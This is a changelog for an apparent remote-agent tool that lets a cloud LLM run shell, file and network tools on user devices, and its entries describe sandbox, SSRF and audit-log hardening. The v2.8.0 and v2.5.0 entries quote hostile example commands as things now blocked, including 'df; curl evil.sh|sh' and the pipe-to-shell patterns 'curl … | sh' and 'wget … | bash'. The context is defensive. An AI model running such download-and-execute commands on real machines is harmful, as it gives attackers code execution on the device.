# Changelog

## v2.8.1

- **macOS app launcher**: `open` added to the default shell allowlist —
  the agent can now launch apps, files and URLs (e.g. `open -a Calendar`)
  out of the box. Everything still runs through the same argv-based
  sandbox: realpath resolution, scrubbed env, per-segment allowlist.

## v2.8.0 — hardened core (security pass)

- **Shell: argv execution, no string-to-shell.** Commands are parsed into
  argv arrays (quote-aware) and executed via `execFile`/`spawn` with
  `shell: false`. Chains (`&&`, `||`, `;`) and pipes (`|`) are supported but
  EVERY segment's executable must pass the allowlist — `df; curl evil.sh|sh`
  is now structurally impossible, not just regex-blocked. Redirects, `$(...)`,
  backticks and env-assignment prefixes are rejected.
- **Binaries resolved to realpath before execution**; allowlist matches the
  resolved absolute path, not a substring of the command string.
- **Scrubbed child environment** — only `PATH/HOME/LANG` (+ a few safe vars)
  leak into children; API keys and other secrets never do. Only allowlisted
  env vars (`$HOME`, `$PATH`, …) are expanded; everything else stays literal.
- **Process-group kill on timeout** — the whole tree dies, no orphans.
- **`REMOTE_SHELL_UNSAFE=1` is deprecated.** Unrestricted shell is now a
  policy decision (`"shell": {"unsafe": true}` in `policy.json`) that is
  audited. The env flag still works for one minor version with a warning.
- **SSRF-safe networking.** `net` and `web` now resolve DNS themselves,
  verify EVERY address against blocked ranges (loopback, private, link-local,
  metadata, CGNAT, reserved, IPv6 equivalents), connect to the validated IP
  with Host header + TLS SNI, re-validate every redirect hop (max 5), block
  cloud metadata endpoints by name and IP, and cap response size (no
  decompression bombs). No env bypass exists.
- **Files: TOCTOU + special-file hardening.** Files are opened with
  `O_NOFOLLOW` and the opened descriptor is verified — no symlink swap
  between check and open. FIFOs, devices and sockets are refused. Deletes
  move to `~/.remote-agent/trash` by default (`purge: true` for permanent).
- **Policy engine v2** — every decision is written to a hash-chained,
  append-only audit log (`~/.remote-agent/audit.jsonl`; verify with
  `remote-agent audit verify`); per-tool rate limits (`rateLimits`); presets
  `strict` / `standard` / `permissive` (`remote-agent policy preset`);
  `remote-agent policy explain <tool>` shows exactly which rule fired.
- **Policy choke point in the tool registry** — every invocation (daemon,
  brain loop, `exec` CLI) passes the local policy engine. The control plane
  can never widen it.
- **CI** — matrix Node 20/22/24 × Ubuntu/macOS, dependency audit job
  (`npm audit --audit-level=high`), dependabot, actions pinned to commit SHAs.
- **Red-team test suite** — `apps/desktop/test/security.test.mjs`: 58
  adversarial cases (command injection, allowlist bypass, pipe-to-shell,
  path traversal, symlink escape, SSRF incl. DNS-rebinding simulation and
  redirect-to-metadata, FIFO refusal, audit-chain tampering, rate limits).
  Full suite: 451 tests green.

## v2.7.0

- **Dead weight wired up** — `packages/engine` and `packages/protocol` are
  now the single source of truth the daemon runs on; the inline loop and
  hand-rolled wire format are gone:
  - The agentic loop (plan → act → reflect → answer) now runs on the shared
    **TaskLoop** engine core — policy checks on every tool call, corrective
    nudges, budget steering and a forced conclusion are engine guarantees,
    not daemon habits
  - **Policy-as-code** — `~/.remote-agent/policy.json` (or `REMOTE_POLICY`) now
    governs tool authorization (`allow`/`deny`/`confirm`), shell patterns and
    daily budget caps; safe defaults apply when no file exists
  - **Budget governor** — daily token/cost caps degrade the reasoning profile
    (normal → eco → critical → exhausted) and block new tasks when spent;
    usage is reported in `stats` and streamed to the dashboard
  - **Structured memory** — the engine's `MemoryStore` (dedupe, TTL, scored
    recall) now auto-remembers finished tasks and injects recalled context
    into future prompts alongside the markdown memory tool
  - **Shared wire contract** — every outbound frame is a versioned envelope
    from `@remote-agent/protocol`; inbound frames with an unknown protocol version
    are rejected at connect time (close code 4002); `agent.log` type added
  - **Lenient parser merged upstream** — the battle-tested brain-reply parser
    (balanced-brace extraction, broken-JSON salvage, reasoning preserved on
    tool calls) now lives in the engine, so the daemon and any future client
    parse identically
- **Skills tests fixed** — test isolation from the real `~/.remote-agent` config
- Test suite grew 58 → 104 (engine loop/parser, protocol contract, skills);
  all green on Node 20/22

## v2.6.0

- **Always-visible progress** — every think step now emits `task:step
  (i/maxSteps)`, so a task can never appear stuck or loop without output
- **Professional README** — five promises: saves money (cheap-first model
  routing, per-run cost traces), zero API keys on device, fully transparent,
  never loops silently, controlled exclusively via remoteagent.online


## v2.5.0

- **Files sandbox hardened** — fixed a path-boundary bug that could let a
  `../workspace-evil` sibling path escape the workspace; symlink escapes are
  now rejected (realpath check on every access); writes are capped at 1 MB;
  deleting the workspace root is refused
- **Shell guard extended** — `poweroff`/`reboot`/`halt` and pipe-to-shell
  downloads (`curl … | sh`, `wget … | bash`) are now always blocked
- **New tool: `notify`** — desktop notifications (macOS osascript, Linux
  notify-send, Windows msg) with strict shell-metacharacter sanitization
- **Version alignment** — device-reported version now 1.6.0 (was stale 1.5.0,
  out of sync with the desktop package)


## v2.4.0

- Multi-device platform — devices register as first-class entities (name,
  platform, metrics, online status), agents are assigned to devices, and the
  dashboard groups agents by device with per-device telemetry
- Device-aware task routing — a device only sees tasks for agents assigned to
  it; unassigned agents run on any online device
- Atomic task claims — the claim response now tells the device whether it
  actually won the task (claimed true/false), so multiple devices can never
  execute the same task twice
- Run traces now record the executing device and keep the real agent identity


## v2.3.0

- Persistent memory injection — the brain loads your memory notes at every
  task start and keeps them updated, so the agent gets smarter with each task
- Few-shot exemplars in the system prompt — the reasoning protocol is shown
  by example, improving JSON compliance and reasoning quality (~150 tokens)
- Actor-critic verification — every final answer is checked by the strongest
  available model, no matter which model did the actual work
- Uncertainty rule — unverifiable facts are reported honestly instead of
  guessed


## v2.2.0

- Deep reasoning engine: plan → act → reflect → verify loop with visible
  reasoning at every step
- Auto brain mode: per-task smart/cheap balancing (step budget, verification,
  provider routing) — simple tasks stay cheap, complex tasks go deep
- Live debug log, per-run traces with tokens/cost/latency, insights graphs
- Training export (JSONL) with human feedback ratings
- Premium plans via the Sngine package framework (limits, plan-aware brains)
- Compliance documentation suite (CRA, ISO 27001, IEC 62443, GDPR, SBOM)


All notable changes to the remote-agent client are documented here.
Format: [Keep a Changelog](https://keepachangelog.com), versioning:
[SemVer](https://semver.org).

## [2.1.0] — 2026-08-13

### Added

- **Agentic execution loop** — the device is no longer a listener; it's an
  operator. Tasks from the dashboard flow into a cloud task queue, the
  device claims them within seconds, and the remoteagent.online brain plans the
  work: think  act  observe  deliver. Up to 8 tool steps per task, with
  every step streamed to the dashboard activity feed in real time.
- **Cloud task queue (WS-free command channel)** — devices poll for work
  every 2 s over HTTPS, so command execution works on every hosting
  setup. No inbound ports, no WebSocket upgrade required.
- **Tools-on-demand protocol** — one system prompt, four tools
  (`sysinfo`, `shell`, `files`, `net`). The brain replies in plain text or
  a single JSON tool call — provider-agnostic by design.
- **Live execution trace** — `tool.call` / `tool.result` events land in
  the dashboard feed as they happen.
- **Persistent conversations** — every task and its answer are stored in
  the cloud conversation, so chat history survives restarts.

## [2.0.0] — 2026-08-13

### Added

- **HTTP metrics pipeline** — device metrics (CPU, memory, disk, load,
  uptime, host info) stream to the cloud every 10 s via HTTPS POST,
  independent of the WebSocket channel. Live monitoring works on every
  hosting setup, including shared hosting without WS proxying.
- **Resilient control channel** — WebSocket upgrade is detected at runtime;
  when unavailable the daemon transparently keeps streaming over HTTPS and
  skips the reconnect storm.
- **Local dashboard API** — the daemon serves a localhost API + WebSocket
  for the terminal dashboard and desktop UI.
- Extended device metrics: CPU %, load average, memory, disk, uptime,
  CPU model, core count.
- Monorepo layout: `apps/desktop` (agent), `packages/engine` (cloud-brain
  client), `packages/protocol` (message schemas).
- One-line installer with PATH persistence for zsh/bash/profile.

### Changed

- Repo is now **client-only** (SaaS boundary) — server-side code moved to a
  private codebase.
- `remote-agent login` flow stores credentials outside the install dir.

## [1.x] — earlier

### Added

- Terminal dashboard (TUI): live log, auto-follow, scrollback, status.
- Tool sandbox: files, shell (guarded), net, sysinfo.
- Control-plane protocol: register, chat RPC, LLM proxy.
- Docker-platform protocol support (self-hosted control plane).

## Changelog links

[2.1.0]: https://github.com/airemoteagent/AI-Remote-Agent/releases/tag/v2.1.0
[2.0.0]: https://github.com/airemoteagent/AI-Remote-Agent/releases/tag/v2.0.0
